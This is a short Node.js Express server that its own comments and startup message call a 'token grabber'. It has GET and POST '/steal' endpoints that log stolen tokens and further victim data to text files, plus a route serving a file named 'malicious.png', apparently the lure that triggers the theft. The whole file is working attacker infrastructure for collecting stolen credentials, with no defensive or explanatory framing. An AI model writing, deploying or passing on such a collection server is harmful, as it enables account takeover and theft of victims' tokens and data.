const express = require('express');
const fs = require('fs');
const app = express();
const port = 8080;

// Middleware to parse JSON
app.use(express.json());

// Endpoint to receive stolen tokens
app.get('/steal', (req, res) => {
    const token = req.query.token;
    if (token) {
        console.log(`[+] New token received: ${token}`);
        fs.appendFileSync('stolen_tokens.txt', `${new Date().toISOString()} - ${token}\n`);
        res.status(200).send('OK');
    } else {
        res.status(400).send('No token provided');
    }
});

// Endpoint for POST requests with more data
app.post('/steal', (req, res) => {
    const data = req.body;
    if (data.token) {
        console.log(`[+] Detailed data received for token: ${data.token}`);
        fs.appendFileSync('stolen_data.txt', `${new Date().toISOString()} - ${JSON.stringify(data)}\n`);
        res.status(200).send('OK');
    } else {
        res.status(400).send('No token provided');
    }
});

// Serve the malicious image
app.get('/image', (req, res) => {
    res.sendFile(__dirname + '/malicious.png');
});

app.listen(port, () => {
    console.log(`Token grabber server running on port ${port}`);
});
